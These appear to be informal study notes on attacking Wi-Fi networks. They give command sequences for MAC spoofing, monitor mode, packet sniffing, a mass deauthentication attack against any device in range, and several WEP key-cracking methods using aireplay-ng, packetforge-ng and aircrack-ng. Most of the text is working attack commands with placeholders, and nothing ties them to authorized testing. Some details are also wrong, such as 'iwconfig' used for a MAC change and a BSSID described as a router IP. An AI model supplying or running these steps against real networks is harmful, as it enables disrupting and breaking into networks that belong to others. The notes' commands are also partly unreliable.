sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up

Change Mac Address:

Method 1:

>ifconfig wlan0 down
>iwconfig wlan0 hw ether 00:11:22:33:44:55
>ifconfig wlan0 up

Method 2:

>ifconfig wlan0 down
>macchanger --help
>macchanger --random wlan0
>ifconfig wlan0 up




Managed Mode to Monitor Mode:

If it is managed mode then we are going to get those packets only
which consists my MAC address .

And if it is monitor mode then we are going to capture all the packets.

Method 1:

>iwconfig
>airmon-ng start wlan0 (to change managed to mon)
>iwconfig
>airmon-ng stop wlan0 (to change again mon to managed)

Method 2:

>ifconfig wlan0 down
>airmon-ng check kill
>iwconfig wlan0 mode monitor
>ifconfig wlan0 up
>airodump-ng wlan0

Method 3: (This method works in every case)

>ifconfig wlan0 down
>iwconfig wlan0 mode monitor
>ifconfig wlan0 up

Begin:

Description:
>airodump-ng is a packet sniffer.
>It is used to capture all packets within range.
>Display detailed info about network arround us.

>airodump-ng wlan0
>airodump-ng --channel (num) --bssid (mac addrs) --write test wlan0

>>>Here we got some files containing all the packets that been shared between 
   the router and the clients but they are encrypted.



DEAUTHENTICATION ATTACK:

>This attack is used to disconnect any device from any network
within our range even if the network is protected with a key.

>Hacker sends deauthentication packets to the router pretending to be the target
machine (by spoofing its MAC address).

>At the same time, the hacker sends packets to the target machine
(pretending to be the router) telling it that it needs to re-autenticate itself.

COMMAND>>aireplay-ng --deauth 100000000 -a (router mac) -c (target mac) wlan0



B.GAINING ACCESS:

WEP Cracking:

>WEP is Wired Equivalent privacy
>It is an old encryption.
>An algorithm that WEP uses is RC4
>wep is still used in some networks
>and it can be cracked easily

>>>>Client encrypt the data using key and an encrypted packet is
sent in the air and Router decrypts packet using the key.

Proper working of WEP:

>Each packet is encrypted using a unique key stream
>and to generate a key stream IV (initialization Vector) is used
>The IV is of only 24bit
>*IV+key(password)=key stream

and the IV is sent with each packet to ensure that every packet has
its key stream.

Now when the encrypted packet sent to the router then the router needs to decrypt that,
>and to decrypty it, router needs the same process,it requires the IV and the password which the router
already knows and IV is already sent with each packet

>>so here the drawback is that the IV is sent in a plain text and is of only 24bit,which is very easy to crack.

>>Result: >IVs will repeat on busy networks.
          >This makes WEP vulnerable to statistical attacks.
          >Repeated IVs can be used to determine the key stream   
          >and break the encryption.

1.WEP CRACKING BASICS:

1.Capture large number of packets/IVs ==using airodump-ng
2.Analyse he capture IVs and crack the key  ==using aircrack-ng
 
Step 1:
>airodump-ng wlan0
>airodump-ng --channel (target channel) --bssid (router IP) --write (file name) wlan0
>aircrack-ng (cap file)

2.WEP CRACKING:

Problem:
 >If network is not busy
 >It would take some time to capture enough IVs

Solution:

 >Force the AP to generate new IVs 

>Basically any network dont accept the request of any host which is
not inside its network.
>So here we request the network to not ignore my request,by the 
following mwthods,
   >airodump-ng wlan0
   >airodump-ng --channel (target channel) --bssid (router MAC) --write (file name) wlan0
   >aireplay-ng --fakeauth 0 -a (mac of router n/w) -h (mac of my usb) wlan0

   >aireplay-ng --arpreplay -b (mac of target n/w) -h (mac of my usb) wlan0

(>After running this command my usb will wait for the arp request 
>and once my usb receive the arp packet 
>then it will re-transmit it) and that is how we increase the data

   >aircrack-ng (cap file)

SECOND METHOD to generate the traffic:

>airodump-ng --channel (target channel) --bssid (router MAC) --write (file name) wlan0
>aireplay-ng --fakeauth 0 -a (mac of router n/w) -h (mac of my usb) wlan0
>aireplay-ng --chopchop -b (mac of router n/w) -h (mac of my usb) wlan0
>packetforge-ng -0 -a (mac of router n/w) -h (mac of my usb) -k 255.255.255.255 -l 255.255.255.255 -y (name of keystream) -w (any name)
>aireplay-ng -2 -r (file(any name)) wlan0
>aircrack-ng (file name)
